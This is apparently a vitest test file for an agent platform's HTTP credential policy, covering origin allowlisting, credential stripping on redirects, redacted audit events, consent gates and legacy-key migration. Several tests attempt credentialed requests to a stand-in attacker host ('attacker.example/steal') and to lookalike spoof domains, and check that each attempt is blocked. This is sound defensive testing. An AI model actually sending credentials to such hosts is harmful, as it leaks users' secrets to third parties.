/**
 * #1125 — the safe execution policy over credential profiles (part 3 of epic #1122).
 *
 * Real schema and real routes; only the network is faked, and every outbound request is recorded with
 * its headers so "where did the credential go" is measured, not assumed.
 *
 *   - host allowlisting: a credential is sent only to a listed https origin (exact, or an explicit
 *     `https://*.domain` subdomain entry), and is never decrypted for one that is not;
 *   - redirect stripping: a cross-origin hop drops every credential-derived header — including one the
 *     name heuristic would not recognise — and a later hop back to the original origin never gets it back;
 *   - audit: one `http.credential_use` event per credentialed call, whatever its outcome, with ids,
 *     strategy, origin, method, consent and result class — and no secret, header value, path or query;
 *   - consent: a mutating call is refused before anything is decrypted until write consent is granted;
 *   - legacy migration: `auth: {mode:"bearer"|"api-key"}` vault keys keep working, are named in the
 *     result and audited, and an unknown mode is refused instead of sending no credential.
 */
import { Hono } from "hono";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { HttpError } from "../lib/auth.js";
import { ensureConsent } from "../lib/connector-consent.js";
import { executeHttpRequest } from "../lib/connectors/http.js";
import type { RegistryToolCtx } from "../lib/connectors/types.js";
import { realSchemaD1, type RealSchemaD1 } from "../lib/d1-sqlite.js";
import { originAllowed } from "../lib/http-profiles.js";
import type { Env } from "../types.js";

vi.mock("../lib/auth.js", async () => {
	const actual = await vi.importActual<typeof import("../lib/auth.js")>("../lib/auth.js");
	return { ...actual, requireUser: async () => ({ uid: "u1", roles: [] }) };
});
const { httpBindingRoutes, httpProfileRoutes } = await import("./http-profiles.js");
const { toolRoutes } = await import("./tools.js");

const SECRET = "sk_live_policy_secret_0123456789";
const INSTANCE = "inst-1125";
const TOKEN_URL = "https://auth.example.com/oauth/token";

let d1: RealSchemaD1;
let env: Env;
let sent: Array<{ url: string; method: string; headers: Record<string, string> }>;
let answer: (url: string) => Response;

const app = new Hono<{ Bindings: Env }>();
app.route("/v1/http-profiles", httpProfileRoutes);
app.route("/v1/instances", httpBindingRoutes);
app.route("/v1/instances", toolRoutes);
app.onError((e, c) => (e instanceof HttpError ? c.json({ error: e.message }, e.status as 400) : c.json({ error: String(e) }, 500)));
const json = (body: unknown, status = 200, extra: Record<string, string> = {}) => new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json", ...extra } });
const redirectTo = (location: string) => new Response(null, { status: 302, headers: { Location: location } });

beforeEach(() => {
	d1 = realSchemaD1();
	d1.exec("INSERT INTO users (id, github_login) VALUES ('u1', 'u1')");
	d1.exec(`INSERT INTO agents (id, owner_id, slug, name, config) VALUES ('ag', 'u1', 't1125', 'HTTP agent', '${JSON.stringify({ capabilities: { surfaces: [], runtime: null, tools: ["http_request"] } })}')`);
	d1.exec(`INSERT INTO agent_instances (id, agent_id, user_id, status, config) VALUES ('${INSTANCE}', 'ag', 'u1', 'active', '{}')`);
	env = { DB: d1.DB, KEY_ENCRYPTION_KEY: "a".repeat(64), SESSION_SIGNING_KEY: "s".repeat(64) } as unknown as Env;
	sent = [];
	answer = () => json({ ok: true });
	vi.stubGlobal("fetch", async (input: RequestInfo | URL, init?: RequestInit) => {
		const url = String(input instanceof Request ? input.url : input);
		const headers: Record<string, string> = {};
		new Headers(init?.headers).forEach((v, k) => {
			headers[k] = v;
		});
		sent.push({ url, method: init?.method ?? "GET", headers });
		return answer(url);
	});
});
afterEach(() => {
	vi.unstubAllGlobals();
	d1.close();
});

async function call(method: string, path: string, body?: unknown) {
	const res = await app.request(path, { method, headers: { "Content-Type": "application/json" }, ...(body === undefined ? {} : { body: JSON.stringify(body) }) }, env, { waitUntil: () => {}, passThroughOnException: () => {}, props: {} });
	const raw = await res.text();
	// biome-ignore lint/suspicious/noExplicitAny: read field by field
	return { status: res.status, raw, json: (raw.startsWith("{") ? JSON.parse(raw) : {}) as Record<string, any> };
}
async function profile(name: string, allowedOrigins: string[], strategy = "header_template", strategyConfig: unknown = { header: { name: "X-Key", template: "{{secret}}" } }) {
	const created = await call("POST", "/v1/http-profiles", { name, secret: SECRET, strategy, strategyConfig, allowedOrigins });
	expect(created.status, created.raw).toBe(201);
	expect((await call("PUT", `/v1/instances/${INSTANCE}/http-bindings/${name}`, { profileId: created.json.profile.id })).status).toBe(200);
	return created.json.profile as { id: string };
}
const request = (args: Record<string, unknown>) => call("POST", `/v1/instances/${INSTANCE}/tools/http_request`, args);
const audits = (): Array<Record<string, unknown>> =>
	(d1.sqlite.prepare("SELECT message, context FROM agent_events WHERE event = 'http.credential_use' ORDER BY rowid").all() as Array<{ message: string; context: string }>).map((r) => ({ message: r.message, ...(JSON.parse(r.context) as Record<string, unknown>) }));
function everyStoredValue(): string {
	const tables = (d1.sqlite.prepare("SELECT name FROM sqlite_master WHERE type='table'").all() as Array<{ name: string }>).map((t) => t.name);
	const out: string[] = [];
	for (const t of tables) for (const row of d1.sqlite.prepare(`SELECT * FROM "${t}"`).all() as Array<Record<string, unknown>>) for (const v of Object.values(row)) out.push(v instanceof Uint8Array ? Buffer.from(v).toString("latin1") : String(v));
	return out.join("\n");
}
const carried = (s: { headers: Record<string, string> }) => Object.values(s.headers).some((v) => v.includes(SECRET));

describe("host allowlisting (#1125)", () => {
	it("a listed origin gets the credential; any other host is refused before anything is sent — with what to do", async () => {
		await profile("discord", ["https://discord.com"]);
		expect((await request({ url: "https://discord.com/api/v10/users/@me", profile: "discord" })).json.success).toBe(true);
		const r = await request({ url: "https://attacker.example/steal", profile: "discord" });
		expect(r.json.success).toBe(false);
		expect(r.json.content).toMatch(/may not be sent to https:\/\/attacker\.example: it allows only https:\/\/discord\.com\. Its owner adds the host with update_http_profile/);
		expect(sent.map((s) => s.url)).toEqual(["https://discord.com/api/v10/users/@me"]);
	});

	it("a profile with no allowed origins is sent nowhere (default deny)", async () => {
		await profile("open", []);
		const r = await request({ url: "https://api.example.com/x", profile: "open" });
		expect(r.json.content).toMatch(/lists no allowed origins, so it is sent nowhere/);
		expect(sent).toHaveLength(0);
	});

	it("a refused host never decrypts or mints: an OAuth2 profile does not even reach its token endpoint", async () => {
		await profile("cc", ["https://api.example.com"], "oauth2_client_credentials", { tokenUrl: TOKEN_URL, clientId: "c" });
		await request({ url: "https://elsewhere.example/x", profile: "cc" });
		expect(sent).toHaveLength(0);
	});

	it("allowedOrigins are https only; a wildcard is exactly `https://*.<domain>`", async () => {
		for (const bad of [["http://discord.com"], ["https://*.com"], ["https://a.*.example.com"], ["https://discord.com/api"]]) {
			const r = await call("POST", "/v1/http-profiles", { name: "x", secret: SECRET, allowedOrigins: bad });
			expect(r.status, JSON.stringify(bad)).toBe(400);
			expect(r.raw).not.toContain(SECRET);
		}
		expect((await call("POST", "/v1/http-profiles", { name: "w", secret: SECRET, allowedOrigins: ["https://*.example.com"] })).status).toBe(201);
	});

	it.each([
		["https://api.example.com/x", ["https://api.example.com"], true],
		["https://api.example.com:8443/x", ["https://api.example.com"], false],
		["https://api.example.com:8443/x", ["https://api.example.com:8443"], true],
		["http://api.example.com/x", ["https://api.example.com"], false],
		["https://a.example.com/x", ["https://*.example.com"], true],
		["https://a.b.example.com/x", ["https://*.example.com"], true],
		["https://example.com/x", ["https://*.example.com"], false],
		["https://evilexample.com/x", ["https://*.example.com"], false],
		["https://example.com.evil.net/x", ["https://*.example.com"], false],
	])("originAllowed(%s, %j) → %s", (url, allowed, expected) => {
		expect(originAllowed(allowed, url)).toBe(expected);
	});
});

describe("redirect stripping (#1125)", () => {
	it("a cross-origin redirect drops the credential — even under a name the heuristic would not recognise — and a hop BACK never restores it", async () => {
		await profile("key", ["https://api.example.com"]); // the credential rides in `X-Key`
		answer = (u) => (u.startsWith("https://api.example.com/start") ? redirectTo("https://other.example.net/hop") : u.startsWith("https://other.example.net") ? redirectTo("https://api.example.com/back") : json({ ok: true }));
		const r = await request({ url: "https://api.example.com/start", profile: "key" });
		expect(sent.map((s) => [new URL(s.url).origin, carried(s)])).toEqual([
			["https://api.example.com", true],
			["https://other.example.net", false],
			["https://api.example.com", false],
		]);
		expect(JSON.parse(r.json.content.replace(/^<[^>]+>[\s\S]*?\n\n/, "").replace(/\n<\/[^>]+>$/, ""))).toMatchObject({ redirect: { crossOrigin: true, credentialStripped: true, finalOrigin: "https://api.example.com" } });
		expect(audits()[0]).toMatchObject({ redirect: { hops: 2, crossOrigin: true, credentialStripped: true } });
	});

	it("a same-origin redirect keeps the credential (that origin is the allowed one)", async () => {
		await profile("key", ["https://api.example.com"]);
		answer = (u) => (u.endsWith("/old") ? redirectTo("/new") : json({ ok: true }));
		await request({ url: "https://api.example.com/old", profile: "key" });
		expect(sent.map(carried)).toEqual([true, true]);
	});
});

describe("redacted audit events (#1125)", () => {
	it("one event per credentialed call, for every outcome — ids, strategy, origin, method, consent, result class — and never the secret, a header value, a path or a query", async () => {
		const p = await profile("discord", ["https://discord.com"], "header_template", { header: { name: "Authorization", template: "Bot {{secret}}" } });
		answer = (u) => (u.includes("missing") ? json({ message: `Unknown user, you sent Bot ${SECRET}` }, 404) : json({ ok: true }));
		await request({ url: "https://discord.com/api/v10/users/@me?with_token=1", profile: "discord" });
		await request({ url: "https://discord.com/api/v10/users/missing", profile: "discord" });
		await request({ url: "https://attacker.example/x", profile: "discord" });
		await request({ url: "https://discord.com/x", profile: "nope" });
		await request({ method: "POST", url: "https://discord.com/api/v10/channels/1/messages", profile: "discord", body: { content: "hi" } });

		const a = audits();
		expect(a.map((e) => [e.resultClass, e.consent, e.origin])).toEqual([
			["ok", "not_required", "https://discord.com"],
			["client_error", "not_required", "https://discord.com"],
			["blocked_host", "not_required", "https://attacker.example"],
			["no_profile", "not_required", "https://discord.com"],
			["blocked_consent", "denied", "https://discord.com"],
		]);
		expect(a[0]).toMatchObject({ credential: "profile", bindingName: "discord", profileId: p.id, strategy: "header_template", method: "GET", connector: "http", status: 200 });
		const all = JSON.stringify(a);
		expect(all).not.toContain(SECRET);
		expect(all).not.toContain("Bot ");
		expect(all).not.toContain("/api/v10");
		expect(all).not.toContain("with_token");
		expect(everyStoredValue()).not.toContain(SECRET);
	});
});

describe("consent gates still hold (#1125)", () => {
	it("a mutating call is refused — nothing decrypted, nothing sent — until write consent is granted; then it goes, and the audit says which", async () => {
		await profile("cc", ["https://api.example.com"], "oauth2_client_credentials", { tokenUrl: TOKEN_URL, clientId: "c" });
		answer = (u) => (u === TOKEN_URL ? json({ access_token: "tok-1", expires_in: 3600 }) : json({ ok: true }));
		const denied = await request({ method: "DELETE", url: "https://api.example.com/things/1", profile: "cc" });
		expect(denied.json.content).toMatch(/isn't permitted for this agent \(write consent denied\)\. Enable write access for http/);
		expect(sent).toHaveLength(0);

		await ensureConsent(env, INSTANCE, "u1", "http", "write");
		expect((await request({ method: "DELETE", url: "https://api.example.com/things/1", profile: "cc" })).json.success).toBe(true);
		expect(audits().map((e) => [e.consent, e.resultClass])).toEqual([
			["denied", "blocked_consent"],
			["granted", "ok"],
		]);
	});
});

describe("legacy vault credentials: kept, named, audited (#1125 migration)", () => {
	const ctx = (): RegistryToolCtx => ({ env, userId: "u1", instanceId: INSTANCE, connectorClient: () => ({ token: async () => "legacy-vault-key-xyz" }) }) as unknown as RegistryToolCtx;

	it("`auth: {mode:'bearer'}` still sends the vault key — and says so in the result and the audit, never its value", async () => {
		const r = await executeHttpRequest(ctx(), { url: "https://api.example.com/x", auth: { mode: "bearer" } });
		expect(sent[0].headers.authorization).toBe("Bearer legacy-vault-key-xyz");
		expect(r.content).toContain('"credential"');
		expect(JSON.parse(r.content).credential).toEqual({ kind: "legacy_vault", provider: "http", mode: "bearer" });
		expect(audits()).toEqual([expect.objectContaining({ credential: "legacy_vault", provider: "http", mode: "bearer", resultClass: "ok" })]);
		expect(JSON.stringify(audits())).not.toContain("legacy-vault-key-xyz");
	});

	it("a legacy api-key header is stripped on a cross-origin redirect too, by its configured name", async () => {
		answer = (u) => (u.startsWith("https://api.example.com") ? redirectTo("https://cdn.example.net/file") : json({ ok: true }));
		await executeHttpRequest(ctx(), { url: "https://api.example.com/x", auth: { mode: "api-key", key: { in: "header", name: "X-Vendor-Id" } } });
		expect(sent.map((s) => s.headers["x-vendor-id"] ?? null)).toEqual(["legacy-vault-key-xyz", null]);
	});

	it("an unsupported auth mode is refused with the path that exists — it no longer goes out with no credential", async () => {
		const r = await executeHttpRequest(ctx(), { url: "https://api.example.com/x", auth: { mode: "basic" } });
		expect(r.success).toBe(false);
		expect(r.content).toMatch(/Unsupported auth mode "basic"\. .* use `profile` with a credential profile bound to this instance/);
		expect(sent).toHaveLength(0);
	});

	it("a call with no credential at all writes no credential audit (unchanged)", async () => {
		await executeHttpRequest(ctx(), { url: "https://api.example.com/x" });
		expect(audits()).toEqual([]);
	});
});
